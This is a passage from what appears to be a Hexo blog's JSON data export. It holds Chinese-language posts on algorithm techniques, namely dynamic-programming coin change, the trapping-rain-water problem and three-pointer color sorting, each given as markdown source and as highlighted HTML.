class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 动态规划</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> fn = <span class=\"function\">(<span class=\"params\">n</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">let</span> a = <span class=\"number\">1</span>; <span class=\"comment\">// 上上一步的结果</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> b = <span class=\"number\">2</span>; <span class=\"comment\">// 上一步的结果</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>; <span class=\"comment\">// 当前步的结果</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">3</span>; i &lt;= n; i++) &#123;</span><br><span class=\"line\">    res = a + b;</span><br><span class=\"line\">    a = b;</span><br><span class=\"line\">    b = res;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>"},{"title":"技巧篇 - 动态规划 - 硬币找零问题","date":"2021-05-24T08:32:28.000Z","_content":"\n# 技巧篇 - 动态规划 - 硬币找零问题\n\n**最少硬币找零问题是给出要找零的钱数，以及可用的硬币面额d1… dn及其数量， 找到所需的最少的硬币个数。**\n\n> 例如， 美国有以下面额（ 硬币）： d1 = 1， d2 = 5， d3 = 10， d4 = 25。<br/>\n> 如果要找36美分的零钱， 我们可以用1个25美分、 1 个10美分和1个便士（ 1 美分）。\n\n```js\nfunction makeMinCoins (coinsArr) {\n    let coins = coinsArr;\n    let cache = {};\n\n    return function markChange (amount) {\n        if (!amount) {\n            return [];\n        }\n        if (cache[amount]) {\n            return cache[amount];\n        }\n\n        let res = [];\n        \n        for (let coin of coins) {\n            let newAmount = amount - coin;\n            let newMin;\n            \n            if (newAmount >= 0) {\n                newMin = markChange(newAmount);\n            }\n            \n            // `newMin.length + 1 < res.length` 在多个结果中寻找最优解\n            // `newMin.length || !newAmount` 保证结果是合理值\n            if (newAmount >= 0 && (newMin.length + 1 < res.length || !res.length) && (newMin.length || !newAmount)) {\n                res = [coin].concat(newMin);\n            }\n        }\n        console.log(`amount: ${amount} ---> markChange : ${res} `);\n\n        return (cache[amount] = res);\n    };\n}\n\nlet markChange = makeMinCoins([1, 5, 8, 10, 25]);\nmarkChange(36);\n```","source":"_posts/算法题/动态规划 - 硬币找零问题.md","raw":"---\ntitle: 技巧篇 - 动态规划 - 硬币找零问题\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n# 技巧篇 - 动态规划 - 硬币找零问题\n\n**最少硬币找零问题是给出要找零的钱数，以及可用的硬币面额d1… dn及其数量， 找到所需的最少的硬币个数。**\n\n> 例如， 美国有以下面额（ 硬币）： d1 = 1， d2 = 5， d3 = 10， d4 = 25。<br/>\n> 如果要找36美分的零钱， 我们可以用1个25美分、 1 个10美分和1个便士（ 1 美分）。\n\n```js\nfunction makeMinCoins (coinsArr) {\n    let coins = coinsArr;\n    let cache = {};\n\n    return function markChange (amount) {\n        if (!amount) {\n            return [];\n        }\n        if (cache[amount]) {\n            return cache[amount];\n        }\n\n        let res = [];\n        \n        for (let coin of coins) {\n            let newAmount = amount - coin;\n            let newMin;\n            \n            if (newAmount >= 0) {\n                newMin = markChange(newAmount);\n            }\n            \n            // `newMin.length + 1 < res.length` 在多个结果中寻找最优解\n            // `newMin.length || !newAmount` 保证结果是合理值\n            if (newAmount >= 0 && (newMin.length + 1 < res.length || !res.length) && (newMin.length || !newAmount)) {\n                res = [coin].concat(newMin);\n            }\n        }\n        console.log(`amount: ${amount} ---> markChange : ${res} `);\n\n        return (cache[amount] = res);\n    };\n}\n\nlet markChange = makeMinCoins([1, 5, 8, 10, 25]);\nmarkChange(36);\n```","slug":"算法题/动态规划 - 硬币找零问题","published":1,"updated":"2021-06-07T10:06:47.812Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1y20002ok6redi597i2","content":"<h1 id=\"技巧篇-动态规划-硬币找零问题\"><a href=\"#技巧篇-动态规划-硬币找零问题\" class=\"headerlink\" title=\"技巧篇 - 动态规划 - 硬币找零问题\"></a>技巧篇 - 动态规划 - 硬币找零问题</h1><p><strong>最少硬币找零问题是给出要找零的钱数，以及可用的硬币面额d1… dn及其数量， 找到所需的最少的硬币个数。</strong></p>\n<blockquote>\n<p>例如， 美国有以下面额（ 硬币）： d1 = 1， d2 = 5， d3 = 10， d4 = 25。<br/><br>如果要找36美分的零钱， 我们可以用1个25美分、 1 个10美分和1个便士（ 1 美分）。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">makeMinCoins</span> (<span class=\"params\">coinsArr</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> coins = coinsArr;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> cache = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">markChange</span> (<span class=\"params\">amount</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!amount) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cache[amount]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> cache[amount];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">let</span> res = [];</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> coin <span class=\"keyword\">of</span> coins) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> newAmount = amount - coin;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> newMin;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (newAmount &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                newMin = markChange(newAmount);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// `newMin.length + 1 &lt; res.length` 在多个结果中寻找最优解</span></span><br><span class=\"line\">            <span class=\"comment\">// `newMin.length || !newAmount` 保证结果是合理值</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (newAmount &gt;= <span class=\"number\">0</span> &amp;&amp; (newMin.length + <span class=\"number\">1</span> &lt; res.length || !res.length) &amp;&amp; (newMin.length || !newAmount)) &#123;</span><br><span class=\"line\">                res = [coin].concat(newMin);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`amount: <span class=\"subst\">$&#123;amount&#125;</span> ---&gt; markChange : <span class=\"subst\">$&#123;res&#125;</span> `</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (cache[amount] = res);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> markChange = makeMinCoins([<span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">25</span>]);</span><br><span class=\"line\">markChange(<span class=\"number\">36</span>);</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-动态规划-硬币找零问题\"><a href=\"#技巧篇-动态规划-硬币找零问题\" class=\"headerlink\" title=\"技巧篇 - 动态规划 - 硬币找零问题\"></a>技巧篇 - 动态规划 - 硬币找零问题</h1><p><strong>最少硬币找零问题是给出要找零的钱数，以及可用的硬币面额d1… dn及其数量， 找到所需的最少的硬币个数。</strong></p>\n<blockquote>\n<p>例如， 美国有以下面额（ 硬币）： d1 = 1， d2 = 5， d3 = 10， d4 = 25。<br/><br>如果要找36美分的零钱， 我们可以用1个25美分、 1 个10美分和1个便士（ 1 美分）。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">makeMinCoins</span> (<span class=\"params\">coinsArr</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> coins = coinsArr;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> cache = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">markChange</span> (<span class=\"params\">amount</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!amount) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cache[amount]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> cache[amount];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">let</span> res = [];</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> coin <span class=\"keyword\">of</span> coins) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> newAmount = amount - coin;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> newMin;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (newAmount &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                newMin = markChange(newAmount);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// `newMin.length + 1 &lt; res.length` 在多个结果中寻找最优解</span></span><br><span class=\"line\">            <span class=\"comment\">// `newMin.length || !newAmount` 保证结果是合理值</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (newAmount &gt;= <span class=\"number\">0</span> &amp;&amp; (newMin.length + <span class=\"number\">1</span> &lt; res.length || !res.length) &amp;&amp; (newMin.length || !newAmount)) &#123;</span><br><span class=\"line\">                res = [coin].concat(newMin);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`amount: <span class=\"subst\">$&#123;amount&#125;</span> ---&gt; markChange : <span class=\"subst\">$&#123;res&#125;</span> `</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (cache[amount] = res);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> markChange = makeMinCoins([<span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">25</span>]);</span><br><span class=\"line\">markChange(<span class=\"number\">36</span>);</span><br></pre></td></tr></table></figure>"},{"title":"技巧篇 - 分治法 - 接雨水问题","date":"2021-05-24T08:32:28.000Z","_content":"\n# 技巧篇 - 分治法 - 接雨水问题\n\n```js\n/**\n * 接雨水问题\n * 给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。\n * 输入: [0,1,0,2,1,0,1,3,2,1,2,1] 输出: 6\n*/\n\nfunction fn(height) {\n  let res = 0;\n  let max = 0;\n  let maxIndex;\n\n  for (let i = 0; i < height.length; i++) {\n    if (height[i] > max) {\n      max = height[i];\n      maxIndex = i;\n    }\n  }\n\n  let leftMax = 0;\n  for (let i = 0; i < maxIndex; i++) {\n    leftMax = Math.max(leftMax, height[i]);\n    res += leftMax - height[i];\n  }\n\n  let rightMax = 0;\n  for (let i = height.length - 1; i >= maxIndex; i--) {\n    rightMax = Math.max(rightMax, height[i]);\n    res += rightMax - height[i];\n  }\n\n  return res;\n}\n```","source":"_posts/算法题/技巧篇 - 分治法 - 接雨水问题.md","raw":"---\ntitle: 技巧篇 - 分治法 - 接雨水问题\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n# 技巧篇 - 分治法 - 接雨水问题\n\n```js\n/**\n * 接雨水问题\n * 给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。\n * 输入: [0,1,0,2,1,0,1,3,2,1,2,1] 输出: 6\n*/\n\nfunction fn(height) {\n  let res = 0;\n  let max = 0;\n  let maxIndex;\n\n  for (let i = 0; i < height.length; i++) {\n    if (height[i] > max) {\n      max = height[i];\n      maxIndex = i;\n    }\n  }\n\n  let leftMax = 0;\n  for (let i = 0; i < maxIndex; i++) {\n    leftMax = Math.max(leftMax, height[i]);\n    res += leftMax - height[i];\n  }\n\n  let rightMax = 0;\n  for (let i = height.length - 1; i >= maxIndex; i--) {\n    rightMax = Math.max(rightMax, height[i]);\n    res += rightMax - height[i];\n  }\n\n  return res;\n}\n```","slug":"算法题/技巧篇 - 分治法 - 接雨水问题","published":1,"updated":"2021-06-07T10:05:21.337Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1y30004ok6rhbra89d4","content":"<h1 id=\"技巧篇-分治法-接雨水问题\"><a href=\"#技巧篇-分治法-接雨水问题\" class=\"headerlink\" title=\"技巧篇 - 分治法 - 接雨水问题\"></a>技巧篇 - 分治法 - 接雨水问题</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 接雨水问题</span></span><br><span class=\"line\"><span class=\"comment\"> * 给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。</span></span><br><span class=\"line\"><span class=\"comment\"> * 输入: [0,1,0,2,1,0,1,3,2,1,2,1] 输出: 6</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\">height</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> maxIndex;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; height.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (height[i] &gt; max) &#123;</span><br><span class=\"line\">      max = height[i];</span><br><span class=\"line\">      maxIndex = i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> leftMax = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; maxIndex; i++) &#123;</span><br><span class=\"line\">    leftMax = <span class=\"built_in\">Math</span>.max(leftMax, height[i]);</span><br><span class=\"line\">    res += leftMax - height[i];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> rightMax = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = height.length - <span class=\"number\">1</span>; i &gt;= maxIndex; i--) &#123;</span><br><span class=\"line\">    rightMax = <span class=\"built_in\">Math</span>.max(rightMax, height[i]);</span><br><span class=\"line\">    res += rightMax - height[i];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-分治法-接雨水问题\"><a href=\"#技巧篇-分治法-接雨水问题\" class=\"headerlink\" title=\"技巧篇 - 分治法 - 接雨水问题\"></a>技巧篇 - 分治法 - 接雨水问题</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 接雨水问题</span></span><br><span class=\"line\"><span class=\"comment\"> * 给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。</span></span><br><span class=\"line\"><span class=\"comment\"> * 输入: [0,1,0,2,1,0,1,3,2,1,2,1] 输出: 6</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\">height</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> maxIndex;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; height.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (height[i] &gt; max) &#123;</span><br><span class=\"line\">      max = height[i];</span><br><span class=\"line\">      maxIndex = i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> leftMax = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; maxIndex; i++) &#123;</span><br><span class=\"line\">    leftMax = <span class=\"built_in\">Math</span>.max(leftMax, height[i]);</span><br><span class=\"line\">    res += leftMax - height[i];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> rightMax = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = height.length - <span class=\"number\">1</span>; i &gt;= maxIndex; i--) &#123;</span><br><span class=\"line\">    rightMax = <span class=\"built_in\">Math</span>.max(rightMax, height[i]);</span><br><span class=\"line\">    res += rightMax - height[i];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"技巧篇 - 三指针","date":"2021-05-24T08:32:28.000Z","_content":"\n# 技巧篇 - 三指针\n\n## 1. 颜色分类 (leetcode 题目编号 75)\n\n**描述**\n给定一个包含红色、白色和蓝色，一共 n 个元素的数组，原地对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。\n\n此题中，我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。\n\n\n**示例:**\n输入: [2,0,2,1,1,0]\n输出: [0,0,1,1,2,2]\n\n**解题思路**\n* 可将所求结果理解成 `[0, ..., 0]`、`[1, ..., 1]`、 `[2, ..., 2]` 三块\n* 初始化0的最右边界：`p0 = 0` （左闭右开区间）\n* 初始化2的最左边界：`p2 = n - 1` （左开右闭区间）\n* 初始化当前考虑的元素序号 ：`curr = 0`\n* `While (curr <= p2)` :\n  * 若 `nums[curr] = 0` ：交换第 curr 个和第 p0 个元素，并将指针都向右移。\n  * 若 `nums[curr] = 2` ：交换第 curr 个和第 p2个元素，并将 p2 指针左移。\n  * 若 `nums[curr] = 1` ：将指针 curr 右移。\n\n```js\nvar sortColors = function(nums) {\n  let swap = (a, b) => {\n    let temp = nums[a]\n    nums[a] = nums[b]\n    nums[b] = temp\n  }\n\n  let curr = 0\n  let left = 0\n  let right = nums.length - 1\n\n  while (curr <= right) {\n    if (nums[curr] === 0) {\n      swap(left++, curr--)\n    } else if (nums[curr] === 2) {\n      swap(right--, curr)\n    } else {\n      curr++\n    }\n  }\n\n  return nums\n};\n```\n\n","source":"_posts/算法题/技巧篇 - 三指针.md","raw":"---\ntitle: 技巧篇 - 三指针\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n# 技巧篇 - 三指针\n\n## 1. 颜色分类 (leetcode 题目编号 75)\n\n**描述**\n给定一个包含红色、白色和蓝色，一共 n 个元素的数组，原地对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。\n\n此题中，我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。\n\n\n**示例:**\n输入: [2,0,2,1,1,0]\n输出: [0,0,1,1,2,2]\n\n**解题思路**\n* 可将所求结果理解成 `[0, ..., 0]`、`[1, ..., 1]`、 `[2, ..., 2]` 三块\n* 初始化0的最右边界：`p0 = 0` （左闭右开区间）\n* 初始化2的最左边界：`p2 = n - 1` （左开右闭区间）\n* 初始化当前考虑的元素序号 ：`curr = 0`\n* `While (curr <= p2)` :\n  * 若 `nums[curr] = 0` ：交换第 curr 个和第 p0 个元素，并将指针都向右移。\n  * 若 `nums[curr] = 2` ：交换第 curr 个和第 p2个元素，并将 p2 指针左移。\n  * 若 `nums[curr] = 1` ：将指针 curr 右移。\n\n```js\nvar sortColors = function(nums) {\n  let swap = (a, b) => {\n    let temp = nums[a]\n    nums[a] = nums[b]\n    nums[b] = temp\n  }\n\n  let curr = 0\n  let left = 0\n  let right = nums.length - 1\n\n  while (curr <= right) {\n    if (nums[curr] === 0) {\n      swap(left++, curr--)\n    } else if (nums[curr] === 2) {\n      swap(right--, curr)\n    } else {\n      curr++\n    }\n  }\n\n  return nums\n};\n```\n\n","slug":"算法题/技巧篇 - 三指针","published":1,"updated":"2021-06-07T09:59:41.515Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1yf0006ok6r5veq87ni","content":"<h1 id=\"技巧篇-三指针\"><a href=\"#技巧篇-三指针\" class=\"headerlink\" title=\"技巧篇 - 三指针\"></a>技巧篇 - 三指针</h1><h2 id=\"1-颜色分类-leetcode-题目编号-75\"><a href=\"#1-颜色分类-leetcode-题目编号-75\" class=\"headerlink\" title=\"1. 颜色分类 (leetcode 题目编号 75)\"></a>1. 颜色分类 (leetcode 题目编号 75)</h2><p><strong>描述</strong><br>给定一个包含红色、白色和蓝色，一共 n 个元素的数组，原地对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。</p>\n<p>此题中，我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。</p>\n<p><strong>示例:</strong><br>输入: [2,0,2,1,1,0]<br>输出: [0,0,1,1,2,2]</p>\n<p><strong>解题思路</strong></p>\n<ul>\n<li>可将所求结果理解成 <code>[0, ..., 0]</code>、<code>[1, ..., 1]</code>、 <code>[2, ..., 2]</code> 三块</li>\n<li>初始化0的最右边界：<code>p0 = 0</code> （左闭右开区间）</li>\n<li>初始化2的最左边界：<code>p2 = n - 1</code> （左开右闭区间）</li>\n<li>初始化当前考虑的元素序号 ：<code>curr = 0</code></li>\n<li><code>While (curr &lt;= p2)</code> :<ul>\n<li>若 <code>nums[curr] = 0</code> ：交换第 curr 个和第 p0 个元素，并将指针都向右移。</li>\n<li>若 <code>nums[curr] = 2</code> ：交换第 curr 个和第 p2个元素，并将 p2 指针左移。</li>\n<li>若 <code>nums[curr] = 1</code> ：将指针 curr 右移。</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> sortColors = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> swap = <span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> temp = nums[a]</span><br><span class=\"line\">    nums[a] = nums[b]</span><br><span class=\"line\">    nums[b] = temp</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> curr = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> left = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> right = nums.length - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (curr &lt;= right) &#123;</span><br><span 